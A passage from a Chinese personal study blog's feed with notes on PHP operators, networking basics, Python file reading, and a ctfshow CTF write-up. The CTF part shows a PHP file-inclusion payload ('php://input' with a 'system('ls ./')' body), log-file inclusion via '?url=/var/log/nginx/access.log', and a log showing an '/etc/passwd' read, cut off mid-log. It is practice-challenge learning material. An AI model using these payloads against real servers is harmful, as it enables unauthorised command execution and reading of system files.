class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**（上面没有忘了写，就是空白**</span><br><span class="line"></span><br><span class="line">## **PHP运算符**</span><br><span class="line"></span><br><span class="line">#### **PHP算术运算符**</span><br><span class="line"></span><br><span class="line">**+-*/%加减乘除取余**</span><br><span class="line"></span><br><span class="line">**-x设置负数和取反**</span><br><span class="line"></span><br></pre></td></tr></table></figure><?php $x=100;$y=6;echo($x+$y);echo("<br>");echo($x-$y);echo("<br>");echo($x*$y);echo("<br>");echo($x/$y);echo("<br>");echo($x%$y);echo("<br>");echo(-$y);?><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**测试输出**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>106<br>94<br>600<br>16.666666666667<br>4<br>-6</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#### **PHP 赋值运算符**</span><br><span class="line"></span><br><span class="line">**在 PHP 中，基本的赋值运算符是 =。它意味着左操作数被设置为右侧表达式的值。也就是说，$x = 5 的值是 5。**</span><br><span class="line"></span><br><span class="line">#### **PHP 递增/递减运算符**</span><br><span class="line"></span><br><span class="line">| **运算符** | **名称**   | **描述**                |</span><br><span class="line">| :--------- | :--------- | :---------------------- |</span><br><span class="line">| **++ x**   | **预递增** | **x 加 1，然后返回 x**  |</span><br><span class="line">| **x ++**   | **后递增** | **返回 x，然后 x 加 1** |</span><br><span class="line">| **-- x**   | **预递减** | **x 减 1，然后返回 x**  |</span><br><span class="line">| **x --**   | **后递减** | **返回 x，然后 x 减 1** |</span><br><span class="line"></span><br><span class="line">#### **PHP 比较运算符**</span><br><span class="line"></span><br><span class="line">**比较操作符可以比较两个值：**</span><br><span class="line"></span><br><span class="line">| **运算符**  | **名称**       | **描述**                                           | **实例**               |</span><br><span class="line">| :---------- | :------------- | :------------------------------------------------- | :--------------------- |</span><br><span class="line">| **x == y**  | **等于**       | **如果 x 等于 y，则返回 true**                     | **5==8 返回 false**    |</span><br><span class="line">| **x === y** | **绝对等于**   | **如果 x 等于 y，且它们类型相同，则返回 true**     | **5===&quot;5&quot; 返回 false** |</span><br><span class="line">| **x != y**  | **不等于**     | **如果 x 不等于 y，则返回 true**                   | **5!=8 返回 true**     |</span><br><span class="line">| **x &lt;&gt; y**  | **不等于**     | **如果 x 不等于 y，则返回 true**                   | **5&lt;&gt;8 返回 true**     |</span><br><span class="line">| **x !== y** | **不绝对等于** | **如果 x 不等于 y，或它们类型不相同，则返回 true** | **5!==&quot;5&quot; 返回 true**  |</span><br><span class="line">| **x &gt; y**   | **大于**       | **如果 x 大于 y，则返回 true**                     | **5&gt;8 返回 false**     |</span><br><span class="line">| **x &lt; y**   | **小于**       | **如果 x 小于 y，则返回 true**                     | **5&lt;8 返回 true**      |</span><br><span class="line">| **x &gt;= y**  | **大于等于**   | **如果 x 大于或者等于 y，则返回 true**             | **5&gt;=8 返回 false**    |</span><br><span class="line">| **x &lt;= y**  | **小于等于**   | **如果 x 小于或者等于 y，则返回 true**             | **5&lt;=8 返回 true**     |</span><br><span class="line"></span><br><span class="line">#### **PHP 逻辑运算符**</span><br><span class="line"></span><br><span class="line">| **运算符**   | **名称** | **描述**                                         | **实例**                                 |</span><br><span class="line">| :----------- | :------- | :----------------------------------------------- | :--------------------------------------- |</span><br><span class="line">| **x and y**  | **与**   | **如果 x 和 y 都为 true，则返回 true**           | **x=6 y=3 (x &lt; 10 and y &gt; 1) 返回 true** |</span><br><span class="line">| **x or y**   | **或**   | **如果 x 和 y 至少有一个为 true，则返回 true**   | **x=6 y=3 (x==6 or y==5) 返回 true**     |</span><br><span class="line">| **x xor y**  | **异或** | **如果 x 和 y 有且仅有一个为 true，则返回 true** | **x=6 y=3 (x==6 xor y==3) 返回 false**   |</span><br><span class="line">| **x &amp;&amp; y**   | **与**   | **如果 x 和 y 都为 true，则返回 true**           | **x=6 y=3 (x &lt; 10 &amp;&amp; y &gt; 1) 返回 true**  |</span><br><span class="line">| **x \|\| y** | **或**   | **如果 x 和 y 至少有一个为 true，则返回 true**   | **x=6 y=3 (x==5 \|\| y==5) 返回 false**  |</span><br><span class="line">| **! x**      | **非**   | **如果 x 不为 true，则返回 true**                | **x=6 y=3 !(x==y) 返回 true**            |</span><br><span class="line"></span><br><span class="line">#### **PHP 数组运算符**</span><br><span class="line"></span><br><span class="line">| **运算符**  | **名称**   | **描述**                                                     |</span><br><span class="line">| :---------- | :--------- | :----------------------------------------------------------- |</span><br><span class="line">| **x + y**   | **集合**   | **x 和 y 的集合**                                            |</span><br><span class="line">| **x == y**  | **相等**   | **如果 x 和 y 具有相同的键/值对，则返回 true**               |</span><br><span class="line">| **x === y** | **恒等**   | **如果 x 和 y 具有相同的键/值对，且顺序相同类型相同，则返回 true** |</span><br><span class="line">| **x != y**  | **不相等** | **如果 x 不等于 y，则返回 true**                             |</span><br><span class="line">| **x &lt;&gt; y**  | **不相等** | **如果 x 不等于 y，则返回 true**                             |</span><br><span class="line">| **x !== y** | **不恒等** | **如果 x 不等于 y，则返回 true**                             |</span><br><span class="line"></span><br><span class="line">#### **三元运算符**</span><br><span class="line"></span><br><span class="line">**另一个条件运算符是&quot;?:&quot;（或三元）运算符 。**</span><br><span class="line"></span><br><span class="line">##### **语法格式**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>(expr1) ? (expr2) : (expr3) </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**对 expr1 求值为 TRUE 时的值为 expr2，在 expr1 求值为 FALSE 时的值为 expr3。**</span><br><span class="line"></span><br><span class="line">**自 PHP 5.3 起，可以省略三元运算符中间那部分。表达式 expr1 ?: expr3 在 expr1 求值为 TRUE 时返回 expr1，否则返回 expr3。**</span><br><span class="line"></span><br><span class="line">#### **组合比较符(PHP7+)**</span><br><span class="line"></span><br><span class="line">**PHP7+ 支持组合比较符（combined comparison operator）也称之为太空船操作符，符号为 &lt;=&gt;。组合比较运算符可以轻松实现两个变量的比较，当然不仅限于数值类数据的比较。**</span><br><span class="line"></span><br><span class="line">**语法格式如下：**</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>$c = $a &lt;=&gt; $b;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**解析如下：**</span><br><span class="line"></span><br><span class="line">- **如果 $a &gt; $b, 则 $c 的值为 1。**</span><br><span class="line">- **如果 $a == $b, 则 $c 的值为 0。**</span><br><span class="line">- **如果 $a &lt; $b, 则 $c 的值为 -1。**</span><br><span class="line"></span><br><span class="line">#### **运算符优先级**</span><br><span class="line"></span><br><span class="line">**下表按照优先级从高到低列出了运算符。同一行中的运算符具有相同优先级，此时它们的结合方向决定求值顺序。**</span><br><span class="line"></span><br><span class="line">**说明：左 ＝ 从左到右，右 ＝ 从右到左。**</span><br><span class="line"></span><br><span class="line">| **结合方向** | **运算符**                                                   | **附加信息**                 |</span><br><span class="line">| :----------- | :----------------------------------------------------------- | :--------------------------- |</span><br><span class="line">| **无**       | **clone new**                                                | **clone 和 new**             |</span><br><span class="line">| **左**       | **[**                                                        | **array()**                  |</span><br><span class="line">| **右**       | **++ -- ~ (int) (float) (string) (array) (object) (bool) @** | **类型和递增／递减**         |</span><br><span class="line">| **无**       | **instanceof**                                               | **类型**                     |</span><br><span class="line">| **右**       | **!**                                                        | **逻辑运算符**               |</span><br><span class="line">| **左**       | *** / %**                                                    | **算术运算符**               |</span><br><span class="line">| **左**       | **+ – .**                                                    | **算术运算符和字符串运算符** |</span><br><span class="line">| **左**       | **&lt;&lt; &gt;&gt;**                                                    | **位运算符**                 |</span><br><span class="line">| **无**       | **== != === !== &lt;&gt;**                                         | **比较运算符**               |</span><br><span class="line">| **左**       | **&amp;**                                                        | **位运算符和引用**           |</span><br><span class="line">| **左**       | **^**                                                        | **位运算符**                 |</span><br><span class="line">| **左**       | **\|**                                                       | **位运算符**                 |</span><br><span class="line">| **左**       | **&amp;&amp;**                                                       | **逻辑运算符**               |</span><br><span class="line">| **左**       | **\|\|**                                                     | **逻辑运算符**               |</span><br><span class="line">| **左**       | **? :**                                                      | **三元运算符**               |</span><br><span class="line">| **右**       | **= += -= *= /= .= %= &amp;= \|= ^= &lt;&lt;= &gt;&gt;= =&gt;**                 | **赋值运算符**               |</span><br><span class="line">| **左**       | **and**                                                      | **逻辑运算符**               |</span><br><span class="line">| **左**       | **xor**                                                      | **逻辑运算符**               |</span><br><span class="line">| **左**       | **or**                                                       | **逻辑运算符**               |</span><br><span class="line">| **左**       | **,**                                                        | **多处用到**                 |</span><br><span class="line"></span><br><span class="line">## IF-ELSE</span><br><span class="line"></span><br><span class="line">if 语句：在条件成立时执行代码</span><br><span class="line"></span><br><span class="line">if...else语句：在条件成立时执行一块代码，条件不成立时执行另一块</span><br><span class="line"></span><br><span class="line">if...else...else语句：在若干条件之一成立时执行一个代码块</span><br><span class="line"></span><br><span class="line">switch语句：在若干条件之一成立时执行一个代码块</span><br><span class="line"></span><br><span class="line">#### if语句</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>if (条件)<br>{<br>条件成立时执行的代码;<br>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### if-else语句</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>if (条件)<br>{<br>条件成立时执行的代码;<br>}<br>else<br>{<br>条件不成立实质性的代码;<br>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### if-elseif-else语句</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>if (条件)<br>{<br>    if 条件成立时执行的代码;<br>}<br>elseif (条件)<br>{<br>    elseif 条件成立时执行的代码;<br>}<br>else<br>{<br>    条件不成立时执行的代码;<br>}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## switch语句</span><br><span class="line"></span><br><span class="line">有选择的执行若干代码块之一</span><br><span class="line"></span><br></pre></td></tr></table></figure><?phpswitch(n){case label1:    执行的语句    break;case label2:    执行的语句    break;    default:    如果 n 既不等于 label1 也不等于 label2，此处代码将执行;}?><pre><code>## PHP数组在PHP中，array()函数用来创建数组：在PHP中，有三种类型的数组：- 数值数组-带有数字ID的数组- 关联数组-带有指定的键的数组，每个键关联一个值- 多维数组-包含一个或者多个数组 的数组</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>因为闲的没事又不想打题又不想打游戏所以就来看了会计网</title>
      <link href="/2023/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C1/"/>
      <url>/2023/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C1/</url>
      
        <content type="html"><![CDATA[<h3 id="核心部分和边缘部分，三种交换方式"><a href="#核心部分和边缘部分，三种交换方式" class="headerlink" title="核心部分和边缘部分，三种交换方式"></a>核心部分和边缘部分，三种交换方式</h3><p>从工作方式上看，互联网可以划分为边缘部分和核心部分</p><h4 id="边缘部分："><a href="#边缘部分：" class="headerlink" title="边缘部分："></a>边缘部分：</h4><p>用户能够直接使用的，用来进行通信和资源共享</p><h4 id="核心部分："><a href="#核心部分：" class="headerlink" title="核心部分："></a>核心部分：</h4><p>有大量的网络和连接这些网络的路由器组成。这部分是为边缘部分提供服务的（提供连通性和交换）</p><h4 id="边缘部分：-1"><a href="#边缘部分：-1" class="headerlink" title="边缘部分："></a>边缘部分：</h4><p>处于互联网边缘的部分就是互联网就是互联网上的所有的主机。这些主机又被称之为端系统。边缘部分就是利用核心部分所提供的服务使得众多主机之间能够互相通信并交换或者共享信息。</p><p>互联网之间的通信：实际上是主机A上的某个进程和主机B上的某个进程之间进行通信。</p><p>在网络边缘的端系统之间的通信方式可以分为两种：C/S方式和P2P方式。</p><h4 id="C-S方式（客户-服务器方式）"><a href="#C-S方式（客户-服务器方式）" class="headerlink" title="C/S方式（客户-服务器方式）"></a>C/S方式（客户-服务器方式）</h4><p>这个是在互联网上最常见的，平时的电子邮件，页面访问都是这种方式。</p><p>这种方式中，主机A运行客户程序主动向服务器B发出服务请求，服务器B处理请求以后向主机A提供服务。</p><h4 id="P2P方式（对等连接方式）"><a href="#P2P方式（对等连接方式）" class="headerlink" title="P2P方式（对等连接方式）"></a>P2P方式（对等连接方式）</h4><p>本质上还是一种C/S，与之不同的是P2P中每一台主机即是客户又是服务器。</p><h4 id="核心部分"><a href="#核心部分" class="headerlink" title="核心部分"></a>核心部分</h4><p>在网络核心部分起特殊作用的是路由器。路由器是实现分组交换的关键构建，其任务是转发收到的分组。</p><p>为了了解分组交换，首先我们要先了解电路交换。</p><p>从通信资源的分配角度来说，交换就是通过某种方式动态的分配传输线路的资源。</p><p>比如打电话，必须先拨号建立连接，当听到交换机送来的振铃以后说明已经建立好了联系，当你结束通话后，交换机释放资源。这种“建立连接–通话–释放连接”的方式就是电路交换。电路交换的重点是在通话过程中，通话的两个用户是中占有端到端的通信资源。</p><p>分组交换则是采用存储转发技术，表示吧一个报文（要发送的一整块数据）划分为几个分组后再进行传送，而在传输的过程中，会在每一个数据段的前面加上一段控制信息组成的包头，再进行传输。</p><p><img src="https://s2.loli.net/2023/06/10/MbOLKaj34khFmQ6.jpg" alt="dab175a333e842dab0df284705b8fe40.jpg"></p><p><img src="https://img-blog.csdnimg.cn/c9ff6bb493b44699be16ce69d716170d.jpeg" alt="img"></p><p>由此可见，如果要大量传输数据，电路交换效率更高，而报文交换和分组交换相比，分组交换比报文交换的时延小，灵活性更高</p><h3 id="计算机网络的性能"><a href="#计算机网络的性能" class="headerlink" title="计算机网络的性能"></a>计算机网络的性能</h3><h5 id="1-速率"><a href="#1-速率" class="headerlink" title="1.速率"></a>1.速率</h5><p>数据的传送速率，也被称之为数据率或者比特率。计算机网络中的一个重要的性能指标。</p><h5 id="2-带宽"><a href="#2-带宽" class="headerlink" title="2.带宽"></a>2.带宽</h5><p>1）本来指的是某个信号具有的频带宽度</p><p>2）最高数据率</p><h5 id="3-吞吐量"><a href="#3-吞吐量" class="headerlink" title="3.吞吐量"></a>3.吞吐量</h5><p>单位时间内通过某个网络中某通道传达数据的能力</p><h5 id="4-时延"><a href="#4-时延" class="headerlink" title="4.时延"></a>4.时延</h5><p>数据（一个保温或分组，甚至比特）从网络（或链路）的一端</p>]]></content>
      
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>时隔几百年重新捡起python</title>
      <link href="/2023/05/14/%E6%97%B6%E9%9A%94%E5%87%A0%E7%99%BE%E5%B9%B4%E9%87%8D%E6%96%B0%E6%89%93%E5%BC%80python/"/>
      <url>/2023/05/14/%E6%97%B6%E9%9A%94%E5%87%A0%E7%99%BE%E5%B9%B4%E9%87%8D%E6%96%B0%E6%89%93%E5%BC%80python/</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(r&#x27;你要打开的文件的路径&#x27;) as file_project:</span><br><span class="line">    contents = file_project.read()</span><br><span class="line">print(contents)</span><br></pre></td></tr></table></figure><p>with:python中的一个关键词，用于创建一个代码块，在不需要访问文件的时候自动关闭文件</p><p>r：是一种叫做“raw string”的表示方式，它通常用于表示字符串字面值中的反斜杠字符（\）不应该被解释为转义字符，而是作为字符串的字面值的一部分。</p><p>as file_project:于给上下文管理器创建的对象起一个别名</p><p>如果想要逐行读取，可以加成这样的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(r&#x27;你要打开的文件的路径&#x27;) as file_project:</span><br><span class="line">    for line in file_project:</span><br><span class="line">print(line)</span><br></pre></td></tr></table></figure><p>输出后发现好多的空白行，加个rstrip（）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">with open(r&#x27;你要打开的文件的路径&#x27;) as file_project:</span><br><span class="line">    for line in file_project:</span><br><span class="line">print(line.rstrip())</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门</title>
      <link href="/2023/05/12/web%E5%85%A5%E9%97%A8/"/>
      <url>/2023/05/12/web%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="ctfshow第一类-信息收集"><a href="#ctfshow第一类-信息收集" class="headerlink" title="ctfshow第一类:信息收集"></a>ctfshow第一类:信息收集</h3><h5 id="web-1"><a href="#web-1" class="headerlink" title="web-1"></a>web-1</h5><p>打开以后直接查看源码就可以了</p><h5 id="web-2"><a href="#web-2" class="headerlink" title="web-2"></a>web-2</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">有几种办法</span><br><span class="line">1.ctrl  u查看源码，注释里的就是</span><br><span class="line">2.在url前面添加view-source:</span><br></pre></td></tr></table></figure><h5 id="web-3"><a href="#web-3" class="headerlink" title="web-3"></a>web-3</h5><p>bp抓包重发就行了</p><h5 id="web-4-1"><a href="#web-4-1" class="headerlink" title="web-4-1"></a>web-4-1</h5><p>第四个和B站上给的不一样，是一个文件泄露的</p><p>wp说上来可以用php伪协议进行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?url=php://input放到url后面</span><br><span class="line"></span><br><span class="line">&lt;?php system(&#x27;ls ./&#x27;);?&gt;放到最后</span><br></pre></td></tr></table></figure><p>返回error</p><p>然后bp抓包发现是nginx的，使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure><p>查看日志文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: nginx/1.18.0 (Ubuntu)</span><br><span class="line">Date: Fri, 12 May 2023 06:20:02 GMT</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Connection: close</span><br><span class="line">X-Powered-By: PHP/7.3.11</span><br><span class="line">Content-Length: 5003</span><br><span class="line"></span><br><span class="line">172.12.0.6 - - [12/May/2023:05:48:15 +0000] &quot;GET / HTTP/1.1&quot; 200 715 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:48:40 +0000] &quot;GET /robots.txt HTTP/1.1&quot; 200 715 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:50:31 +0000] &quot;GET /index.php HTTP/1.1&quot; 200 715 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:50:37 +0000] &quot;GET /index.php HTTP/1.1&quot; 200 715 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:52:15 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 1367 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:53:41 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 1554 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:53:51 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 1741 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:54:41 +0000] &quot;GET /?url=php://input HTTP/1.1&quot; 200 15 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:56:21 +0000] &quot;GET /?url=php://input HTTP/1.1&quot; 200 15 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:58:04 +0000] &quot;GET /?url=/etc/passwd HTTP/1.1&quot; 200 2107 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:05:58:28 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 2443 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:01:17 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 2630 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:15:45 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 2817 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1623.0 Safari/537.36&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:15:47 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 3032 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:15:48 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 3205 &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.517 Safari/537.36&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:17:51 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 3418 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:17:56 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 3633 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:17:58 +0000] &quot;POST /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 3843 &quot;-&quot; &quot;Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; ja-jp) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:19:16 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 4086 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:20:01 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 4273 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:20:01 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 4461 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:20:02 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 4648 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0&quot;</span><br><span class="line">172.12.0.6 - - [12/May/2023:06:20:02 +0000] &quot;GET /?url=/var/log/nginx/access.log HTTP/1.1&quot; 200 4829 &quot;-&quot; 